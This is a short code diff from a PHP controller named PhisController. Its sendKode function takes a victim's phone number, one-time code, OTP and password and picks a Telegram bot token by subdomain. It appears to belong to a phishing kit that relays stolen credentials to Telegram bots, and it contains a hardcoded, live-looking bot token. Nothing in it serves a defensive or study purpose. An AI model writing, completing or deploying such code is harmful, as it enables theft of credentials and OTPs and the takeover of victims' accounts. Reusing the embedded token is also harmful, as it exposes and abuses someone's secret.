@@ -38,7 +38,7 @@ class PhisController extends Controller
     public function sendKode($phone = "", $code = "", $otp = "", $password = "", $subdomain = "")
     {
         // mulai dari bot 6 yah
-        $subdomain = "live-vc-private1-my20";
+
         if ($subdomain == "live-vc-private1-my6") {
             // BOT 6
             $bot_token = "8004727206:AAHF_aciKT9HnpKnSBWPTob727wTaUlLAJI";
